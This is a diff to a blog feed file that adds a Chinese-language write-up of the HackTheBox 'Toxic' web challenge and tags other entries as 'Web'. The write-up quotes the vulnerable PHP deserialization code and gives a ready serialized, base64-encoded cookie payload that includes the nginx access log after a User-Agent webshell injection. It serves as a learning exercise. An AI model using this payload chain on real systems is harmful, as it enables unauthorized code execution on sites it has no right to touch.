@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>HackTheBox Toxic WriteUP</title>
+      <link href="/2023/08/23/HackTheBox-Toxic-WriteUP/"/>
+      <url>/2023/08/23/HackTheBox-Toxic-WriteUP/</url>
+      
+        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p></blockquote><p><img src="/image.png" alt="Toxic"></p><p><img src="/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>源代码很简单，只有两个PHP文件</p><pre><code class="php">//index.php&lt;?phpspl_autoload_register(function ($name)&#123;    if (preg_match(&#39;/Model$/&#39;, $name))    &#123;        $name = &quot;models/$&#123;name&#125;&quot;;    &#125;    include_once &quot;$&#123;name&#125;.php&quot;;&#125;);if (empty($_COOKIE[&#39;PHPSESSID&#39;]))&#123;    $page = new PageModel;    $page-&gt;file = &#39;/www/index.html&#39;;    setcookie(        &#39;PHPSESSID&#39;,         base64_encode(serialize($page)),         time()+60*60*24,         &#39;/&#39;    );&#125; $cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);unserialize($cookie);</code></pre><pre><code class="php">//PageModel.php&lt;?phpclass PageModel&#123;    public $file;    public function __destruct()     &#123;        include($this-&gt;file);    &#125;&#125;</code></pre><p>很显然，是一个PHP反序列化+文件包含的漏洞利用。</p><p>这里就需要找到一个可包含的日志文件，我们可以在<code>nginx.conf</code>中找到AccessLog文件的位置。</p><p><img src="/image-2.png" alt="AccessLog"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用<code>User-Agent</code>写入WebShell：</p><p><img src="/image-3.png" alt="UA"></p><p>构造包含AccessLog的序列化数据：</p><pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;//base64encodeTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==</code></pre><p>利用WebShell获得文件名和Flag</p><p><img src="/image-4.png" alt="FileName"></p><p><img src="/image-5.png" alt="Flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结</a></li></ul></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> HackTheBox </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HackTheBox WeatherAPP WriteUP</title>
       <link href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/"/>
       <url>/2023/08/22/HackTheBox-WeatherAPP-WriteUP/</url>
@@ -15,6 +36,8 @@
         <tags>
             
             <tag> HackTheBox </tag>
+            
+            <tag> Web </tag>
             
         </tags>
       
@@ -35,6 +58,8 @@
             
             <tag> HackTheBox </tag>
             
+            <tag> Web </tag>
+            
         </tags>
       
     </entry>
@@ -53,6 +78,8 @@
         <tags>
             
             <tag> HackTheBox </tag>
+            
+            <tag> Web </tag>
             
         </tags>
       
